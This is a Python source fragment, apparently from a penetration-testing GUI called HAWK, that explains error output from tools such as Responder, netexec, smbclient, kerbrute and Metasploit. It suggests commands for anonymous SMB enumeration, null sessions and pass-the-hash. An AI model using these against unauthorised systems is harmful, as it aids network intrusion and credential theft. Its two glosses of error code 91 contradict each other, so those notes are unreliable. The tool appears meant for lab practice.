                    "      • Is the DC name/IP correct? Try fqdn vs IP.\n"
                    "      • LDAPS instead? ldapsearch -H ldaps://<target>:636",
                    "dim")
            elif returncode == 49:
                self.app.terminal.write(
                    "  → ldapsearch 49 = Invalid credentials.", "dim")
            elif returncode == 1:
                self.app.terminal.write(
                    "  → ldapsearch 1 = Operations error (often anonymous\n"
                    "    bind disabled — try -D '' -w '' or a real user).",
                    "dim")
            return

        # ── smbclient ─────────────────────────────────────────────────
        if tool.binary == "smbclient":
            if "nt_status_host_unreachable" in joined:
                self.app.terminal.write(
                    "  → NT_STATUS_HOST_UNREACHABLE: the TCP session opened\n"
                    "    but the host stopped responding. Common causes:\n"
                    "      • VM was paused / rebooted mid-scan.\n"
                    "      • Host firewall dropped the SMB session.\n"
                    "      • Routing changed (VPN flap).\n"
                    "    Verify: ping <target>, then re-run the scan.",
                    "dim")
            elif "nt_status_logon_failure" in joined:
                self.app.terminal.write(
                    "  → NT_STATUS_LOGON_FAILURE: credentials rejected.\n"
                    "    Anonymous/guest is probably disabled — supply\n"
                    "    -U 'user%pass' or use netexec with -H <ntlm>.",
                    "dim")
            elif "nt_status_access_denied" in joined:
                self.app.terminal.write(
                    "  → NT_STATUS_ACCESS_DENIED: share exists but the\n"
                    "    account has no read permission.", "dim")
            elif "nt_status_bad_network_name" in joined:
                self.app.terminal.write(
                    "  → NT_STATUS_BAD_NETWORK_NAME: share name doesn't\n"
                    "    exist. Enumerate first: smbclient -L //<target> -N",
                    "dim")
            return

        # ── metasploit / msfconsole ───────────────────────────────────
        if tool.binary in ("msfconsole", "msf"):
            if "hostunreachable" in joined or "host unreachable" in joined:
                self.app.terminal.write(
                    "  → MSF HostUnreachable: the exploit payload couldn't\n"
                    "    reach the target. Check:\n"
                    "      • Host is still alive: ping <target>\n"
                    "      • Target port is still open (re-run nmap).\n"
                    "      • LHOST is routable from the target.\n"
                    "      • No stateful firewall in between.",
                    "dim")
            elif "handler failed to bind" in joined:
                self.app.terminal.write(
                    "  → MSF 'Handler failed to bind': LPORT already in use.\n"
                    "    Kill the stale listener or pick a new LPORT.",
                    "dim")
            elif "exploit completed, but no session was created" in joined:
                self.app.terminal.write(
                    "  → Exploit ran but no session spawned. Usually:\n"
                    "      • Target patched the vulnerability.\n"
                    "      • AV/EDR killed the payload.\n"
                    "      • Wrong target arch (x86 vs x64).", "dim")
            return

        # ── responder ─────────────────────────────────────────────────
        # Responder exits 1 for many reasons and its own error messages
        # are often buried mid-log. We scan the log for known failure
        # signatures and explain each in plain English.
        if tool.binary == "responder":
            explained = False

            # Must be root
            if ("you need to run responder as root" in joined
                    or "permission denied" in joined
                    or "operation not permitted" in joined):
                self.app.terminal.write(
                    "  → Responder needs root. The command HAWK built\n"
                    "    already starts with `sudo` — if you saw a password\n"
                    "    prompt in xterm and pressed ENTER without typing,\n"
                    "    the privilege escalation failed silently.\n"
                    "    Fix: run once in a plain shell so sudo caches your\n"
                    "    password, then re-click RESPONDER.",
                    "dim")
                explained = True

            # Wrong / missing interface
            if ("the specified interface" in joined
                    or "interface does not exist" in joined
                    or "[!] error: " in joined and "interface" in joined):
                self.app.terminal.write(
                    "  → Interface not found. Reopen the RESPONDER dialog —\n"
                    "    HAWK lists the live interfaces via `ip -o link show`.\n"
                    "    On Kali VMs it's usually eth0; on HTB/THM VPN it's\n"
                    "    tun0; on bare-metal it may be ens33 / enp0s3 / wlan0.",
                    "dim")
                explained = True

            # Port conflicts — Responder tries to bind 53/80/88/135/139/389/445
            # and dies on the first that's busy. We look for "error starting"
            # AND for the exact port numbers.
            port_hits = []
            for p, svc in ((53, "systemd-resolved / dnsmasq"),
                           (80, "apache2 / nginx"),
                           (88, "krb5kdc"),
                           (135, "DCE-RPC"),
                           (139, "smbd (Samba)"),
                           (389, "slapd / openldap"),
                           (445, "smbd (Samba)")):
                # Matches Responder's own error text + a generic fallback:
                #   "Error starting TCP server on port 445"
                #   "[!] Error starting TCP server on port 139, check permissions or other servers running."
                if (f"starting tcp server on port {p}" in joined
                        or f"starting udp server on port {p}" in joined
                        or f"bind: port {p}" in joined
                        or f"address already in use" in joined and f":{p}" in joined):
                    port_hits.append((p, svc))

            if port_hits:
                lines = "\n".join(f"      • port {p}/tcp → {svc}"
                                  for p, svc in port_hits)
                self.app.terminal.write(
                    "  → Port conflict — another service already owns one of\n"
                    "    the ports Responder needs. Conflicts detected:\n"
                    f"{lines}\n"
                    "    Fix (one-shot):\n"
                    "      sudo systemctl stop smbd nmbd apache2 \\\n"
                    "                            systemd-resolved slapd\n"
                    "    Or, reopen the RESPONDER dialog and click\n"
                    "    CLEAR CONFLICTS.",
                    "dim")
                explained = True

            # Responder.conf missing / unwritable (packaged install quirk)
            if ("responder.conf" in joined
                    and ("no such file" in joined or "errno 13" in joined)):
                self.app.terminal.write(
                    "  → Responder.conf not readable. On Kali the default is\n"
                    "    /usr/share/responder/Responder.conf. Run:\n"
                    "      sudo chmod 644 /usr/share/responder/Responder.conf\n"
                    "    If the file is missing entirely:\n"
                    "      sudo apt install --reinstall responder",
                    "dim")
                explained = True

            # Absolute fallback when the log is empty (e.g. user cancelled
            # the xterm before Responder printed anything). Without this
            # the user just sees "exited (code 1)" with no hint at all.
            if not explained:
                self.app.terminal.write(
                    "  → Responder exited with code 1 but didn't print a\n"
                    "    specific reason. Most likely:\n"
                    "      • wrong interface (eth0 vs ens33 vs tun0)\n"
                    "      • smbd / apache2 holding 139/445/80\n"
                    "      • sudo password prompt timed out\n"
                    "      • closed the xterm before Responder finished init\n"
                    "    Reopen the RESPONDER dialog — it runs a port-conflict\n"
                    "    probe and lists the live interfaces for you.",
                    "dim")
            return

        # ── kerbrute ──────────────────────────────────────────────────
        if tool.binary == "kerbrute":
            if "no such host" in joined or "no route" in joined:
                self.app.terminal.write(
                    "  → kerbrute couldn't resolve/reach the DC. Check the\n"
                    "    --dc IP and that 88/tcp (Kerberos) is open.",
                    "dim")
            elif "clockskew" in joined or "clock skew" in joined:
                self.app.terminal.write(
                    "  → Kerberos clock skew: your clock is off from the DC\n"
                    "    by >5 minutes. Run: sudo ntpdate <dc-ip>",
                    "dim")
            return

        # ── nmap host-down generic ────────────────────────────────────
        if tool.binary == "nmap" and "host seems down" in joined:
            self.app.terminal.write(
                "  → nmap thinks the host is down. Add -Pn to skip host\n"
                "    discovery (HAWK's preset nmap tools already do this).",
                "dim")

    def _explain_netexec_errors(self, log: list):
        """Detect common netexec/crackmapexec crashes and turn them into a
        friendlier intel note instead of a raw Python traceback.

        Known patterns:
        - `IndexError: list index out of range` during banner grab → netexec
          tried to parse an SMB response field that wasn't present (often on
          Samba or when signing/encryption forces partial banners).
        - `Could not get nt error code 91 from exception` → smbprotocol threw
          an access-denied state mapper error (common on signing-required
          hosts when no creds are provided).
        """
        if not log or not hasattr(self.app, "target_intel"):
            return
        joined = "\n".join(line for _, line in log).lower()
        hits = []
        if "indexerror" in joined and "list index out of range" in joined:
            hits.append("IndexError")
        if "could not get nt error code" in joined:
            hits.append("NtErrorCode")
        # crackmapexec raises `KeyError: 91` when impacket's error map lacks
        # the STATUS_NETWORK_ACCESS_DENIED code (0x5b == 91).
        if "keyerror: 91" in joined or "unknown error code: 0x5b" in joined:
            hits.append("KeyError91")
        # Classic NT_STATUS surfaces from smbclient/cme — emit info note
        # rather than panic. These aren't Python tracebacks but they do
        # confuse beginners.
        if "nt_status_bad_network_name" in joined:
            hits.append("BadNetworkName")
        if not hits:
            return

        target = self._get_target() or "target"
        desc_parts = [
            "netexec raised an internal parsing error. Almost always a "
            "protocol-level mismatch between NetExec/Impacket and the "
            "target's SMB stack — NOT a HAWK bug.",
            "",
            "Most common triggers:",
            "  • Windows Server 2008 R2 with SMB1 fallback and missing "
            "explicit `-u '' -p ''`.  Impacket's share-enum reply "
            "parser chokes on the info-level reply.",
            "  • Target enforces SMB signing / encryption.",
            "  • Samba with a non-standard banner layout.",
            "",
            "Try these alternatives, in order:",
            f"  1.  netexec smb {target} -u '' -p '' --shares",
            f"      (explicit null-session bind — usually fixes 2008 R2)",
            f"  2.  smbclient -L //{target} -N -I {target}",
            f"      (HAWK's 'SMBCLIENT List' tool)",
            f"  3.  nmap -p 445 --script smb-enum-shares,smb-security-mode {target}",
            f"  4.  rpcclient -U '' -N {target}   # then:  netshareenum",
            f"  5.  With creds from the Credential Store:",
            f"      netexec smb {target} -u <user> -p <pass> --shares",
        ]
        if "NtErrorCode" in hits:
            desc_parts.insert(1,
                "STATUS note: 'Could not get nt error code 91' = "
                "STATUS_INVALID_PARAMETER — the server rejected the "
                "authentication message before reaching a login decision.")
        if "KeyError91" in hits:
            desc_parts.insert(1,
                "STATUS note: 'KeyError: 91' / '0x5b' = "
                "STATUS_NETWORK_ACCESS_DENIED — the share you requested "
                "rejected the anonymous bind. The banner (OS, domain, "
                "signing) is STILL valid and was printed before the "
                "traceback, so netexec DID reach the host.")
        if "BadNetworkName" in hits:
            desc_parts.insert(1,
                "NT_STATUS_BAD_NETWORK_NAME note: the share name you gave "
                "smbclient doesn't exist on the target. Run "
                f"'smbclient -L //{target} -N' first to enumerate the "
                "real share names.")
        self.app.target_intel.add_auto_finding(
            title="NetExec Protocol Error",
            description="\n".join(desc_parts),
            severity="info",
            source="netexec")
        self.app.terminal.write(
            "  [!] netexec hit a protocol error — see Target Intel for an "
            "explanation and alternative commands.", "warning")

